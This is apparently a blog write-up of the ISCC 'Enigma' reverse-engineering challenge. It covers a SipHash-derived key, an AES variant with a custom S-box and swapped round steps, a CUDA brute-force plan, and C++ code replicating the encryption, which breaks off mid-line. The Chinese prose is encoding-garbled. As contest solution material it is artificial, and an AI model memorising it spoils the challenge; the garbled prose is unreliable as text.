text"></p><p>æœ€åä¸€ä¸ªéƒ¨åˆ†å°±æ˜¯å°†è¾“å…¥å­—ç¬¦ä¸²ç”¨åˆšåˆšhashæ‰©å±•ç”Ÿæˆçš„å¯†é’¥è¿›è¡ŒAESåŠ å¯†ï¼Œæœ€åä¸å¯†æ–‡è¿›è¡Œæ¯”è¾ƒã€‚</p><p><img src="/2025/05/25/ISCC-Enigma/image-11.png" alt="alt text"></p><h2 id="è§£å¯†æµç¨‹ç®€è¿°"><a href="#è§£å¯†æµç¨‹ç®€è¿°" class="headerlink" title="è§£å¯†æµç¨‹ç®€è¿°"></a>è§£å¯†æµç¨‹ç®€è¿°</h2><p>çˆ†ç ´16å¤§å°çš„01å­—èŠ‚æ•°ç»„å…¨æ’åˆ—ï¼Œçˆ†ç ´ä¸‰ä¸ªæœªçŸ¥å¯è§†å­—ç¬¦(32-126)ï¼Œç»è¿‡SpiHashç„¶åæ‰©å±•ç”Ÿæˆå¯†é’¥è¿›è¡ŒAESè§£å¯†ï¼Œå¦‚æœè§£å¯†å‡ºISCC{}æ ¼å¼å­—ç¬¦ä¸²ï¼Œå³ä¸ºçˆ†ç ´è§£å¯†æˆåŠŸã€‚</p><p>æ€»ä½“è§£å¯†æ¬¡æ•°æ˜¯ (2^16)*(95^3) &#x3D; 56,188,928,000ï¼Œç”±äºé‡çº§è¿‡å¤§ï¼Œè€ƒè™‘ä½¿ç”¨CUDAè¿›è¡Œçˆ†ç ´ã€‚</p><h2 id="AESé­”æ”¹åˆ†æ"><a href="#AESé­”æ”¹åˆ†æ" class="headerlink" title="AESé­”æ”¹åˆ†æ"></a>AESé­”æ”¹åˆ†æ</h2><p>å’Œæ ‡å‡†AESä»£ç æµç¨‹è¿›è¡Œå¯¹æ¯”ï¼Œåˆ†æå‘ç°æ˜¯mixColumnså’ŒaddRoundKeyè¿›è¡Œäº†å¯¹è°ƒï¼Œå…¶ä»–åœ°æ–¹éƒ½ä¸€æ ·ã€‚</p><p><img src="/2025/05/25/ISCC-Enigma/image-14.png" alt="alt text"></p><p><img src="/2025/05/25/ISCC-Enigma/image-15.png" alt="alt text"></p><p>ç¬¬äºŒä¸ªé­”æ”¹ç‚¹æ˜¯Sboxæ•°å€¼çš„é­”æ”¹ï¼Œå¯¼å‡ºç„¶åæ‰‹åŠ¨ç®—å‡ºInvSboxå³ç”¨äºè§£å¯†ã€‚è§£å¯†çš„æ—¶å€™ä¹ŸåŒæ ·äº¤æ¢mixColumnså’ŒaddRoundKeyçš„è°ƒç”¨å³å¯ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">char</span> S[<span class="number">256</span>] = &#123; <span class="number">0x3f</span>, <span class="number">0x1e</span>, <span class="number">0xfc</span>, <span class="number">0x3d</span>, <span class="number">0x68</span>, <span class="number">0x51</span>, <span class="number">0xf0</span>, <span class="number">0x20</span>, <span class="number">0x92</span>, <span class="number">0x02</span>, <span class="number">0x9d</span>, <span class="number">0xac</span>, <span class="number">0x54</span>, <span class="number">0x6e</span>, <span class="number">0xfb</span>, <span class="number">0x42</span>, <span class="number">0x29</span>, <span class="number">0xe8</span>, <span class="number">0x23</span>, <span class="number">0x2a</span>, <span class="number">0xd5</span>, <span class="number">0xa2</span>, <span class="number">0x3a</span>, <span class="number">0xc0</span>, <span class="number">0xd4</span>, <span class="number">0xba</span>, <span class="number">0xb5</span>, <span class="number">0x84</span>, <span class="number">0xa6</span>, <span class="number">0x74</span>, <span class="number">0x5c</span>, <span class="number">0x08</span>, <span class="number">0xf2</span>, <span class="number">0x22</span>, <span class="number">0xa7</span>, <span class="number">0x41</span>, <span class="number">0x8b</span>, <span class="number">0xeb</span>, <span class="number">0x32</span>, <span class="number">0x0d</span>, <span class="number">0x8a</span>, <span class="number">0x89</span>, <span class="number">0x46</span>, <span class="number">0x70</span>, <span class="number">0x5e</span>, <span class="number">0xa0</span>, <span class="number">0xef</span>, <span class="number">0x67</span>, <span class="number">0x49</span>, <span class="number">0xd3</span>, <span class="number">0x18</span>, <span class="number">0x76</span>, <span class="number">0xbd</span>, <span class="number">0xd0</span>, <span class="number">0x8d</span>, <span class="number">0x2f</span>, <span class="number">0xb4</span>, <span class="number">0x55</span>, <span class="number">0xc5</span>, <span class="number">0xc8</span>, <span class="number">0x36</span>, <span class="number">0x37</span>, <span class="number">0x66</span>, <span class="number">0x04</span>, <span class="number">0xd8</span>, <span class="number">0x01</span>, <span class="number">0x5a</span>, <span class="number">0x2e</span>, <span class="number">0xed</span>, <span class="number">0x91</span>, <span class="number">0xff</span>, <span class="number">0x15</span>, <span class="number">0x6c</span>, <span class="number">0x64</span>, <span class="number">0x5d</span>, <span class="number">0x24</span>, <span class="number">0x72</span>, <span class="number">0x1a</span>, <span class="number">0x75</span>, <span class="number">0x30</span>, <span class="number">0x56</span>, <span class="number">0xbf</span>, <span class="number">0xb1</span>, <span class="number">0x73</span>, <span class="number">0xc7</span>, <span class="number">0x95</span>, <span class="number">0x05</span>, <span class="number">0xb6</span>, <span class="number">0x52</span>, <span class="number">0x31</span>, <span class="number">0xb3</span>, <span class="number">0x10</span>, <span class="number">0x2b</span>, <span class="number">0x6f</span>, <span class="number">0x43</span>, <span class="number">0xbb</span>, <span class="number">0x62</span>, <span class="number">0x7c</span>, <span class="number">0x7b</span>, <span class="number">0xa3</span>, <span class="number">0xbe</span>, <span class="number">0xd9</span>, <span class="number">0xbc</span>, <span class="number">0xdc</span>, <span class="number">0xc9</span>, <span class="number">0x8f</span>, <span class="number">0xa4</span>, <span class="number">0xe3</span>, <span class="number">0xe7</span>, <span class="number">0x17</span>, <span class="number">0x5f</span>, <span class="number">0xe9</span>, <span class="number">0xca</span>, <span class="number">0x6d</span>, <span class="number">0x4e</span>, <span class="number">0xae</span>, <span class="number">0x83</span>, <span class="number">0x63</span>, <span class="number">0x82</span>, <span class="number">0x27</span>, <span class="number">0x4a</span>, <span class="number">0x21</span>, <span class="number">0x71</span>, <span class="number">0x2c</span>, <span class="number">0x57</span>, <span class="number">0x7d</span>, <span class="number">0xaf</span>, <span class="number">0x44</span>, <span class="number">0x85</span>, <span class="number">0xc1</span>, <span class="number">0x47</span>, <span class="number">0x4b</span>, <span class="number">0x48</span>, <span class="number">0xf4</span>, <span class="number">0xfd</span>, <span class="number">0x3c</span>, <span class="number">0xf1</span>, <span class="number">0x45</span>, <span class="number">0x1f</span>, <span class="number">0x5b</span>, <span class="number">0xb8</span>, <span class="number">0xa1</span>, <span class="number">0xc4</span>, <span class="number">0x79</span>, <span class="number">0x53</span>, <span class="number">0x09</span>, <span class="number">0xea</span>, <span class="number">0xee</span>, <span class="number">0x0c</span>, <span class="number">0xd6</span>, <span class="number">0x61</span>, <span class="number">0xc6</span>, <span class="number">0xaa</span>, <span class="number">0xb0</span>, <span class="number">0x69</span>, <span class="number">0x81</span>, <span class="number">0xb9</span>, <span class="number">0x7f</span>, <span class="number">0xec</span>, <span class="number">0x94</span>, <span class="number">0xce</span>, <span class="number">0xa9</span>, <span class="number">0x97</span>, <span class="number">0x3b</span>, <span class="number">0xda</span>, <span class="number">0x8e</span>, <span class="number">0xe5</span>, <span class="number">0x86</span>, <span class="number">0x16</span>, <span class="number">0x11</span>, <span class="number">0xad</span>, <span class="number">0xd1</span>, <span class="number">0xd7</span>, <span class="number">0x40</span>, <span class="number">0xb2</span>, <span class="number">0x65</span>, <span class="number">0xcb</span>, <span class="number">0xb7</span>, <span class="number">0x1c</span>, <span class="number">0x7a</span>, <span class="number">0xf6</span>, <span class="number">0x87</span>, <span class="number">0xcd</span>, <span class="number">0x4f</span>, <span class="number">0x9f</span>, <span class="number">0xab</span>, <span class="number">0x4d</span>, <span class="number">0x0f</span>, <span class="number">0x6a</span>, <span class="number">0xa8</span>, <span class="number">0xde</span>, <span class="number">0xc3</span>, <span class="number">0x39</span>, <span class="number">0x50</span>, <span class="number">0xfa</span>, <span class="number">0x35</span>, <span class="number">0x33</span>, <span class="number">0x90</span>, <span class="number">0xdf</span>, <span class="number">0xf8</span>, <span class="number">0x25</span>, <span class="number">0x8c</span>, <span class="number">0x9c</span>, <span class="number">0xe0</span>, <span class="number">0xf7</span>, <span class="number">0x07</span>, <span class="number">0xe2</span>, <span class="number">0x99</span>, <span class="number">0x77</span>, <span class="number">0x00</span>, <span class="number">0x26</span>, <span class="number">0x6b</span>, <span class="number">0x0b</span>, <span class="number">0x3e</span>, <span class="number">0x1d</span>, <span class="number">0xe1</span>, <span class="number">0x58</span>, <span class="number">0x38</span>, <span class="number">0xc2</span>, <span class="number">0x78</span>, <span class="number">0x0e</span>, <span class="number">0x59</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x88</span>, <span class="number">0xdd</span>, <span class="number">0x9b</span>, <span class="number">0xd2</span>, <span class="number">0x19</span>, <span class="number">0x7e</span>, <span class="number">0xf9</span>, <span class="number">0xdb</span>, <span class="number">0xfe</span>, <span class="number">0x60</span>, <span class="number">0x13</span>, <span class="number">0x4c</span>, <span class="number">0xcc</span>, <span class="number">0xf3</span>, <span class="number">0xa5</span>, <span class="number">0x14</span>, <span class="number">0x34</span>, <span class="number">0x96</span>, <span class="number">0x80</span>, <span class="number">0xe6</span>, <span class="number">0x9a</span>, <span class="number">0xf5</span>, <span class="number">0x9e</span>, <span class="number">0xe4</span>, <span class="number">0x2d</span>, <span class="number">0x03</span>, <span class="number">0x12</span>, <span class="number">0x0a</span>, <span class="number">0xcf</span>, <span class="number">0x98</span>, <span class="number">0x28</span>, <span class="number">0x06</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> inv_S[] = &#123; <span class="number">0xD1</span>, <span class="number">0x41</span>, <span class="number">0x09</span>, <span class="number">0xF9</span>, <span class="number">0x3F</span>, <span class="number">0x56</span>, <span class="number">0xFF</span>, <span class="number">0xCD</span>, <span class="number">0x1F</span>, <span class="number">0x91</span>, <span class="number">0xFB</span>, <span class="number">0xD4</span>, <span class="number">0x94</span>, <span class="number">0x27</span>, <span class="number">0xDC</span>, <span class="number">0xBB</span>, <span class="number">0x5B</span>, <span class="number">0xA9</span>, <span class="number">0xFA</span>, <span class="number">0xEA</span>, <span class="number">0xEF</span>, <span class="number">0x47</span>, <span class="number">0xA8</span>, <span class="number">0x6D</span>, <span class="number">0x32</span>, <span class="number">0xE4</span>, <span class="number">0x4D</span>, <span class="number">0xDF</span>, <span class="number">0xB2</span>, <span class="number">0xD6</span>, <span class="number">0x01</span>, <span class="number">0x8A</span>, <span class="number">0x07</span>, <span class="number">0x79</span>, <span class="number">0x21</span>, <span class="number">0x12</span>, <span class="number">0x4B</span>, <span class="number">0xC8</span>, <span class="number">0xD2</span>, <span class="number">0x77</span>, <span class="number">0xFE</span>, <span class="number">0x10</span>, <span class="number">0x13</span>, <span class="number">0x5C</span>, <span class="number">0x7B</span>, <span class="number">0xF8</span>, <span class="number">0x43</span>, <span class="number">0x37</span>, <span class="number">0x4F</span>, <span class="number">0x59</span>, <span class="number">0x26</span>, <span class="number">0xC4</span>, <span class="number">0xF0</span>, <span class="number">0xC3</span>, <span class="number">0x3C</span>, <span class="number">0x3D</span>, <span class="number">0xD9</span>, <span class="number">0xC0</span>, <span class="number">0x16</span>, <span class="number">0xA3</span>, <span class="number">0x87</span>, <span class="number">0x03</span>, <span class="number">0xD5</span>, <span class="number">0x00</span>, <span class="number">0xAD</span>, <span class="number">0x23</span>, <span class="number">0x0F</span>, <span class="number">0x5E</span>, <span class="number">0x7F</span>, <span class="number">0x89</span>, <span class="number">0x2A</span>, <span class="number">0x82</span>, <span class="number">0x84</span>, <span class="number">0x30</span>, <span class="number">0x78</span>, <span class="number">0x83</span>, <span class="number">0xEB</span>, <span class="number">0xBA</span>, <span class="number">0x72</span>, <span class="number">0xB7</span>, <span class="number">0xC1</span>, <span class="number">0x05</span>, <span class="number">0x58</span>, <span class="number">0x90</span>, <span class="number">0x0C</span>, <span class="number">0x39</span>, <span class="number">0x50</span>, <span class="number">0x7C</span>, <span class="number">0xD8</span>, <span class="number">0xDD</span>, <span class="number">0x42</span>, <span class="number">0x8B</span>, <span class="number">0x1E</span>, <span class="number">0x4A</span>, <span class="number">0x2C</span>, <span class="number">0x6E</span>, <span class="number">0xE9</span>, <span class="number">0x96</span>, <span class="number">0x60</span>, <span class="number">0x75</span>, <span class="number">0x49</span>, <span class="number">0xAF</span>, <span class="number">0x3E</span>, <span class="number">0x2F</span>, <span class="number">0x04</span>, <span class="number">0x9A</span>, <span class="number">0xBC</span>, <span class="number">0xD3</span>, <span class="number">0x48</span>, <span class="number">0x71</span>, <span class="number">0x0D</span>, <span class="number">0x5D</span>, <span class="number">0x2B</span>, <span class="number">0x7A</span>, <span class="number">0x4C</span>, <span class="number">0x53</span>, <span class="number">0x1D</span>, <span class="number">0x4E</span>, <span class="number">0x33</span>, <span class="number">0xD0</span>, <span class="number">0xDB</span>, <span class="number">0x8F</span>, <span class="number">0xB3</span>, <span class="number">0x62</span>, <span class="number">0x61</span>, <span class="number">0x7D</span>, <span class="number">0xE5</span>, <span class="number">0x9D</span>, <span class="number">0xF2</span>, <span class="number">0x9B</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x1B</span>, <span class="number">0x80</span>, <span class="number">0xA7</span>, <span class="number">0xB5</span>, <span class="number">0xE0</span>, <span class="number">0x29</span>, <span class="number">0x28</span>, <span class="number">0x24</span>, <span class="number">0xC9</span>, <span class="number">0x36</span>, <span class="number">0xA5</span>, <span class="number">0x69</span>, <span class="number">0xC5</span>, <span class="number">0x45</span>, <span class="number">0x08</span>, <span class="number">0xDE</span>, <span class="number">0x9F</span>, <span class="number">0x55</span>, <span class="number">0xF1</span>, <span class="number">0xA2</span>, <span class="number">0xFD</span>, <span class="number">0xCF</span>, <span class="number">0xF4</span>, <span class="number">0xE2</span>, <span class="number">0xCA</span>, <span class="number">0x0A</span>, <span class="number">0xF6</span>, <span class="number">0xB8</span>, <span class="number">0x2D</span>, <span class="number">0x8D</span>, <span class="number">0x15</span>, <span class="number">0x63</span>, <span class="number">0x6A</span>, <span class="number">0xEE</span>, <span class="number">0x1C</span>, <span class="number">0x22</span>, <span class="number">0xBD</span>, <span class="number">0xA1</span>, <span class="number">0x98</span>, <span class="number">0xB9</span>, <span class="number">0x0B</span>, <span class="number">0xAA</span>, <span class="number">0x73</span>, <span class="number">0x7E</span>, <span class="number">0x99</span>, <span class="number">0x52</span>, <span class="number">0xAE</span>, <span class="number">0x5A</span>, <span class="number">0x38</span>, <span class="number">0x1A</span>, <span class="number">0x57</span>, <span class="number">0xB1</span>, <span class="number">0x8C</span>, <span class="number">0x9C</span>, <span class="number">0x19</span>, <span class="number">0x5F</span>, <span class="number">0x66</span>, <span class="number">0x34</span>, <span class="number">0x64</span>, <span class="number">0x51</span>, <span class="number">0x17</span>, <span class="number">0x81</span>, <span class="number">0xDA</span>, <span class="number">0xBF</span>, <span class="number">0x8E</span>, <span class="number">0x3A</span>, <span class="number">0x97</span>, <span class="number">0x54</span>, <span class="number">0x3B</span>, <span class="number">0x68</span>, <span class="number">0x70</span>, <span class="number">0xB0</span>, <span class="number">0xEC</span>, <span class="number">0xB6</span>, <span class="number">0xA0</span>, <span class="number">0xFC</span>, <span class="number">0x35</span>, <span class="number">0xAB</span>, <span class="number">0xE3</span>, <span class="number">0x31</span>, <span class="number">0x18</span>, <span class="number">0x14</span>, <span class="number">0x95</span>, <span class="number">0xAC</span>, <span class="number">0x40</span>, <span class="number">0x65</span>, <span class="number">0xA4</span>, <span class="number">0xE7</span>, <span class="number">0x67</span>, <span class="number">0xE1</span>, <span class="number">0xBE</span>, <span class="number">0xC6</span>, <span class="number">0xCB</span>, <span class="number">0xD7</span>, <span class="number">0xCE</span>, <span class="number">0x6B</span>, <span class="number">0xF7</span>, <span class="number">0xA6</span>, <span class="number">0xF3</span>, <span class="number">0x6C</span>, <span class="number">0x11</span>, <span class="number">0x6F</span>, <span class="number">0x92</span>, <span class="number">0x25</span>, <span class="number">0x9E</span>, <span class="number">0x44</span>, <span class="number">0x93</span>, <span class="number">0x2E</span>, <span class="number">0x06</span>, <span class="number">0x88</span>, <span class="number">0x20</span>, <span class="number">0xED</span>, <span class="number">0x85</span>, <span class="number">0xF5</span>, <span class="number">0xB4</span>, <span class="number">0xCC</span>, <span class="number">0xC7</span>, <span class="number">0xE6</span>, <span class="number">0xC2</span>, <span class="number">0x0E</span>, <span class="number">0x02</span>, <span class="number">0x86</span>, <span class="number">0xE8</span>, <span class="number">0x46</span> &#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2025/05/25/ISCC-Enigma/image-16.png" alt="alt text"></p><h2 id="é”™è¯¯ä»£ç éƒ¨åˆ†"><a href="#é”™è¯¯ä»£ç éƒ¨åˆ†" class="headerlink" title="é”™è¯¯ä»£ç éƒ¨åˆ†"></a>é”™è¯¯ä»£ç éƒ¨åˆ†</h2><p>function_8å¤„ä»£ç æœ¬æ„æ˜¯è¦å°†é™æ€çš„æ˜æ–‡xorä¸Š0x10ï¼Œä½†æ˜¯åœ°å€ä¸å¯¹ï¼Œxoråˆ°äº†ä¸€ä¸ªç©ºç™½çš„å†…å­˜ï¼Œæ‰€ä»¥è§£å¯†çš„æ—¶å€™å¾—æŠŠå¯†æ–‡éƒ½xor 0x10ï¼Œæ‰èƒ½æˆåŠŸçˆ†ç ´å‡ºæ¥å¯†é’¥ã€‚</p><p><img src="/2025/05/25/ISCC-Enigma/image-17.png" alt="alt text"></p><h2 id="åŠ å¯†åŒæ„"><a href="#åŠ å¯†åŒæ„" class="headerlink" title="åŠ å¯†åŒæ„"></a>åŠ å¯†åŒæ„</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;AES.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _le64toh(x) ((uint64_t)(x))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ROTATE(x, b) (uint64_t)( ((x) <span class="string">&lt;&lt; (b)) | ( (x) &gt;</span>&gt; (64 - (b))) )</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HALF_ROUND(a,b,c,d,s,t)\</span></span><br><span class="line"><span class="meta">a += b; c += d;\</span></span><br><span class="line"><span class="meta">b = ROTATE(b, s) ^ a;\</span></span><br><span class="line"><span class="meta">d = ROTATE(d, t) ^ c;\</span></span><br><span class="line"><span class="meta">a = ROTATE(a, 32);</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DOUBLE_ROUND(v0,v1,v2,v3)\</span></span><br><span class="line"><span class="meta">HALF_ROUND(v0,v1,v2,v3,13,16);\</span></span><br><span class="line"><span class="meta">HALF_ROUND(v2,v1,v0,v3,17,21);\</span></span><br><span class="line"><span class="meta">HALF_ROUND(v0,v1,v2,v3,13,16);\</span></span><br><span class="line"><span class="meta">HALF_ROUND(v2,v1,v0,v3,17,21);</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">uint64_t</span> <span class="title">siphash24</span><span class="params">(<span class="type">const</span> <span class="type">void</span>* src, <span class="type">unsigned</span> <span class="type">long</span> src_sz, <span class="type">const</span> <span class="type">char</span> key[<span class="number">16</span>])</span> </span>&#123;</span><br><span class="line"><span class="type">const</span> <span class="type">uint64_t</span>* _key = (<span class="type">uint64_t</span>*)key;</span><br><span class="line"><span class="type">uint64_t</span> k0 = _le64toh(_key[<span class="number">0</span>]);</span><br><span class="line"><span class="type">uint64_t</span> k1 = _le64toh(_key[<span class="number">1</span>]);</span><br><span class="line"><span class="type">uint64_t</span> b = (<span class="type">uint64_t</span>)src_sz &lt;&lt; <span class="number">56</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">uint64_t</span>* in = (<span class="type">uint64_t</span>*)src;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> v0 = k0 ^ <span class="number">0x102030405060708</span>;</span><br><span class="line"><span class="type">uint64_t</span> v1 = k1 ^ <span class="number">0x90a0b0c0d0e0f00</span>;</span><br><span class="line"><span class="type">uint64_t</span> v2 = k0 ^ k1 ^ <span class="number">0x123456789abcdef</span>;</span><br><span class="line"><span class="type">uint64_t</span> v3 = k1 ^ k0 ^ <span class="number">0x4953434343435349</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (src_sz &gt;= <span class="number">8</span>) &#123;</span><br><span class="line"><span class="type">uint64_t</span> mi = _le64toh(*in);</span><br><span class="line">in += <span class="number">1</span>; src_sz -= <span class="number">8</span>;</span><br><span class="line">v3 ^= mi;</span><br><span class="line"><span class="built_in">DOUBLE_ROUND</span>(v0, v1, v2, v3);</span><br><span class="line">v0 ^= mi;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> t = <span class="number">0</span>; <span class="type">uint8_t</span>* pt = (<span class="type">uint8_t</span>*)&amp;t; <span class="type">uint8_t</span>* m = (<span class="type">uint8_t</span>*)in;</span><br><span class="line"><span class="keyword">if</span> (src_sz == <span class="number">7</span>)</span><br><span class="line">&#123;</span><br><span class="line">pt[<span class="number">6</span>] = m[<span class="number">6</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (src_sz == <span class="number">6</span>)</span><br><span class="line">&#123;</span><br><span class="line">pt[<span class="number">5</span>] = m[<span class="number">5</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (src_sz == <span class="number">5</span>)</span><br><span class="line">&#123;</span><br><span class="line">pt[<span class="number">4</span>] = m[<span class="number">4</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (src_sz == <span class="number">4</span>)</span><br><span class="line">&#123;</span><br><span class="line">*((<span class="type">uint32_t</span>*)&amp;pt[<span class="number">0</span>]) = *((<span class="type">uint32_t</span>*)&amp;m[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (src_sz == <span class="number">3</span>)</span><br><span class="line">&#123;</span><br><span class="line">pt[<span class="number">2</span>] = m[<span class="number">2</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (src_sz == <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line">pt[<span class="number">1</span>] = m[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (src_sz == <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">pt[<span class="number">0</span>] = m[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line">b |= _le64toh(t);</span><br><span class="line"></span><br><span class="line">v3 ^= b;</span><br><span class="line"><span class="built_in">DOUBLE_ROUND</span>(v0, v1, v2, v3);</span><br><span class="line">v0 ^= b; v2 ^= <span class="number">0xff</span>;</span><br><span class="line"><span class="built_in">DOUBLE_ROUND</span>(v0, v1, v2, v3);</span><br><span class="line"><span class="built_in">DOUBLE_ROUND</span>(v0, v1, v2, v3);</span><br><span class="line"><span class="keyword">return</span> (v0 ^ v1) ^ (v2 ^ v3);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> lRam00000c68&#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">uint32_t</span> <span class="title">my_rand</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">lRam00000c68 = lRam00000c68 * <span class="number">0x5851f42d4c957f2d</span> + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">return</span> (<span class="type">uint32_t</span>)((<span class="type">uint64_t</span>)lRam00000c68 &gt;&gt; <span class="number">0x21</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">my_srand</span><span class="params">(<span class="type">uint32_t</span> seed)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">lRam00000c68 = (<span class="type">uint64_t</span>)(seed - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// éšæœºæ•°ç”Ÿæˆåˆ—è¡¨</span></span><br><span class="line"><span class="built_in">my_srand</span>(<span class="number">1746373320</span>);</span><br><span class="line"><span class="type">uint8_t</span> rndList[<span class="number">16</span>]&#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">rndList[i] = i;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">rndList[i] += (<span class="type">uint8_t</span>)(<span class="built_in">my_rand</span>() % <span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// è¾“å…¥48é•¿åº¦</span></span><br><span class="line"><span class="type">uint8_t</span> input[] = <span class="string">&quot;ISCC&#123;1234123544556ASDASeffgghhiijj12321312312kk&#125;&quot;</span>;</span><br><span class="line"><span class="type">uint8_t</span> out[<span class="number">16</span>]&#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// hashæ˜æ–‡å–inputå‰å…«å­—èŠ‚å’Œæœ€åä¸€ä¸ªå­—èŠ‚</span></span><br><span class="line"><span class="type">uint8_t</span> hash_plaintext[<span class="number">9</span>]&#123;&#125;;</span><br><span class="line"><span class="built_in">memcpy</span>(hash_plaintext, input, <span class="number">8</span>);</span><br><span class="line">hash_plaintext[<span class="number">8</span>] = <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// spihashè®¡ç®—</span></span><br><span class="line"><span class="type">uint64_t</span> hash = <span class="built_in">siphash24</span>(hash_plaintext, <span class="number">9</span>, (<span class="type">const</span> <span 